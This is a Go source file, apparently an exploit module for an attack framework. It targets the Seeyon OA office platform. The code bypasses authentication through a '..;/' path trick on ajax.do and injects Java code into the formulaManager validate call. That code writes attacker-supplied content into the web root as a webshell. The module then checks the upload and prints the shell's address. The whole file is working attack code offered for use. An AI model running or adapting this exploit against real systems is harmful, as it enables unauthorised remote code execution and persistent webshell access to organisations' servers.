package exp_seeyonOA

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

func lzzip(src []byte) []byte {
	dst := make([]byte, 0)
	var dstBuffer bytes.Buffer
	zw := zip.NewWriter(&dstBuffer)
	iow, _ := zw.Create("file.txt")
	iow.Write(src)
	zw.Flush()
	zw.Close()

	//tmp := dstBuffer.Bytes()
	dst = dstBuffer.Bytes()
	return dst
}

type Exp_formulaManagerRCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_formulaManagerRCE) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	target := goutils.AppendUri(self.Params.BaseParam.Target, "/seeyon/autoinstall.do.css/..;/ajax.do")
	// 构造payload

	payload := `[{'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String path = "../webapps/ROOT/";
        java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"{{filename}}");
        String shell = "{{b64content}}";
        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
        String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
        printWriter2.println(decodeString);
        printWriter2.close();};test();def static xxx(){'}, 'true']`
	payload = strings.ReplaceAll(payload, "{{filename}}", filename)
	payload = strings.ReplaceAll(payload, "{{b64content}}", base64.StdEncoding.EncodeToString([]byte(content)))

	payload = url.QueryEscape(payload)
	params := "method=ajaxAction&managerName=formulaManager&managerMethod=validate&arguments=" + payload
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	shellUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/"+filename)
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		self.EchoSuccessMsg("shell地址：%s", shellUrl)
		expResult.Status = true
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_formulaManagerRCE{}, "exp_formulaManagerRCE.yml")

}
